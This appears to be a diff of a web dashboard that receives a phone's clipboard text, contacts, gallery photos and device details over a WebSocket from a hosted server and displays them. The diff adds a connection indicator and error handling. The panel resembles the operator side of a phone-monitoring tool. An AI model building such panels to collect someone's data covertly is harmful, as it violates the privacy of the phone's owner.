@@ -11,7 +11,9 @@
         .card-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; padding-bottom: 10px; margin-bottom: 15px; }
         h2 { margin: 0; color: #38bdf8; font-size: 1.1rem; }
         
-        .status-banner { grid-column: span 2; background: #0f172a; border-left: 4px solid #fbbf24; padding: 12px 16px; border-radius: 8px; font-family: monospace; color: #fbbf24; font-size: 0.95rem; margin-bottom: 5px; }
+        .status-banner { grid-column: span 2; background: #0f172a; border-left: 4px solid #fbbf24; padding: 12px 16px; border-radius: 8px; font-family: monospace; color: #fbbf24; font-size: 0.95rem; margin-bottom: 5px; display: flex; justify-content: space-between; align-items: center; }
+        .conn-dot { height: 12px; width: 12px; background-color: #ef4444; border-radius: 50%; display: inline-block; margin-right: 8px; }
+        .conn-dot.connected { background-color: #22c55e; }
 
         .btn-download { background: #0284c7; color: #fff; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; font-weight: bold; }
         .btn-download:hover { background: #0284c7dd; }
@@ -43,7 +45,8 @@
     <div class="container">
         <!-- Live Status Log Banner -->
         <div class="status-banner" id="statusBanner">
-            <b>Phone Status:</b> Waiting for connection and sync logs...
+            <div><span class="conn-dot" id="connDot"></span><b>Connection Status:</b> <span id="statusText">Connecting to server...</span></div>
+            <div id="syncStats" style="font-size: 0.85rem; color: #38bdf8;">Synced Items: 0</div>
         </div>
 
         <!-- Device Info & Battery -->
@@ -99,69 +102,92 @@
     <script>
         const ws = new WebSocket('wss://liveapp-uo4s.onrender.com');
         let globalContacts = [];
+        let syncedCount = 0;
+
+        ws.onopen = () => {
+            document.getElementById('connDot').classList.add('connected');
+            document.getElementById('statusText').innerText = 'Connected (Waiting for phone data...)';
+        };
+
+        ws.onclose = () => {
+            document.getElementById('connDot').classList.remove('connected');
+            document.getElementById('statusText').innerText = 'Disconnected from server. Retrying...';
+        };
 
         ws.onmessage = (event) => {
-            const data = JSON.parse(event.data);
+            try {
+                const data = JSON.parse(event.data);
 
-            if (data.type === 'STATUS_UPDATE') {
-                document.getElementById('statusBannerinnerHTML = `<b>Phone Status:</b> ${data.message}`;
-            }
+                if (data.type === 'STATUS_UPDATE') {
+                    document.getElementById('statusText').innerText = data.message;
+                }
 
-            if (data.type === 'DEVICE_INFO') {
-                document.getElementById('deviceInfoBox').innerHTML = `
-                    <b>Model:</b> ${data.model} <br>
-                    <b>OS:</b> ${data.os} <br>
-                    <b>Battery:</b> ${data.battery}% <br>
-                    <b>Charging:</b> ${data.charging ? 'Yes' : 'No'}
-                `;
-            }
+                if (data.type === 'DEVICE_INFO') {
+                    document.getElementById('deviceInfoBox').innerHTML = `
+                        <b>Model:</b> ${data.model} <br>
+                        <b>OS:</b> ${data.os} <br>
+                        <b>Battery:</b> ${data.battery}% <br>
+                        <b>Charging:</b> ${data.charging ? 'Yes' : 'No'}
+                    `;
+                    updateStats();
+                }
 
-            if (data.type === 'CLIPBOARD') {
-                const box = document.getElementById('clipboardBox');
-                const div = document.createElement('div');
-                div.className = 'item-row';
-                div.innerText = `[${data.time}] Copied: "${data.text}"`;
-                box.prepend(div);
-            }
-
-            if (data.type === 'CONTACTS_SYNC') {
-                globalContacts = data.contacts;
-                const box = document.getElementById('contactsBox');
-                box.innerHTML = '';
-                globalContacts.forEach(c => {
+                if (data.type === 'CLIPBOARD') {
+                    const box = document.getElementById('clipboardBox');
                     const div = document.createElement('div');
                     div.className = 'item-row';
-                    div.innerText = `${c.name} : ${c.phone}`;
-                    box.appendChild(div);
-                });
-            }
+                    div.innerText = `[${data.time}] Copied: "${data.text}"`;
+                    box.prepend(div);
+                }
 
-            if (data.type === 'GALLERY_SYNC') {
-                const container = document.getElementById('galleryContainer');
-                container.innerHTML = '';
-                data.photos.forEach((photoUri, index) => {
-                    const itemDiv = document.createElement('div');
-                    itemDiv.className = 'gallery-item';
-                    
-                    const img = document.createElement('img');
-                    img.src = photoUri;
-                    img.onclick = () => sendMediaMessage(photoUri);
-                    
-                    const downloadLink = document.createElement('a');
-                    downloadLink.href = photoUri;
-                    downloadLink.download = `photo_${index + 1}.jpg`;
-                    downloadLink.innerText = 'Download';
+                if (data.type === 'CONTACTS_SYNC') {
+                    globalContacts = data.contacts;
+                    const box = document.getElementById('contactsBox');
+                    box.innerHTML = '';
+                    globalContacts.forEach(c => {
+                        const div = document.createElement('div');
+                        div.className = 'item-row';
+                        div.innerText = `${c.name} : ${c.phone}`;
+                        box.appendChild(div);
+                    });
+                    updateStats();
+                }
 
-                    itemDiv.appendChild(img);
-                    itemDiv.appendChild(downloadLink);
-                    container.appendChild(itemDiv);
-                });
-            }
+                if (data.type === 'GALLERY_SYNC') {
+                    const container = document.getElementById('galleryContainer');
+                    container.innerHTML = '';
+                    data.photos.forEach((photoUri, index) => {
+                        const itemDiv = document.createElement('div');
+                        itemDiv.className = 'gallery-item';
+                        
+                        const img = document.createElement('img');
+                        img.src = photoUri;
+                        img.onclick = () => sendMediaMessage(photoUri);
+                        
+                        const downloadLink = document.createElement('a');
+                        downloadLink.href = photoUri;
+                        downloadLink.download = `photo_${index + 1}.jpg`;
+                        downloadLink.innerText = 'Download';
 
-            if (data.type === 'CHAT') {
-                appendMessage(data.text, data.sender === 'phone' ? 'phone' : 'web', data.isImage);
+                        itemDiv.appendChild(img);
+                        itemDiv.appendChild(downloadLink);
+                        container.appendChild(itemDiv);
+                    });
+                    updateStats();
+                }
+
+                if (data.type === 'CHAT') {
+                    appendMessage(data.text, data.sender === 'phone' ? 'phone' : 'web', data.isImage);
+                }
+            } catch (e) {
+                console.error('Error processing message:', e);
             }
         };
+
+        function updateStats() {
+            syncedCount++;
+            document.getElementById('syncStats').innerText = `Sync Packets Received: ${syncedCount}`;
+        }
 
         function sendMessage() {
             const input = document.getElementById('msgInput');
